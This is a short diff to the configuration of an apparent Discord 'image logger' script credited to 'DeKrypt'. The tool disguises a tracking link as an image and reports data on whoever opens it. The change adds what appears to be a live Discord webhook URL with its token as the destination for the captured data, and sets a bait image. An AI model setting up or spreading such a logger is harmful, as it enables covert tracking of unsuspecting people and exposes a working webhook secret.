@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://s39569.pcdn.co/wp-content/uploads/2023/06/computer-popup-box-screen-warning-of-a-system-being-hacked.jpeg",
+    "webhook": "https://discord.com/api/webhooks/1199035213204955207/GOWANaoWaqcAtrQQqiwUpHyh3nW3UGzzvXESpqbrWAu20_tWhl9nopG9dcPbnKerbppj",
     "image": "https://cdn.discordapp.com/attachments/1159594813058977836/1199040971611058327/Ways-Websites-Are-Hacked-How-to-Prevent-Them-1.png?ex=65c118ec&is=65aea3ec&hm=e0dffca5e82ac207a3bc12412eacd42de21a973c60fca4dd555f5a46ff2fae46&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
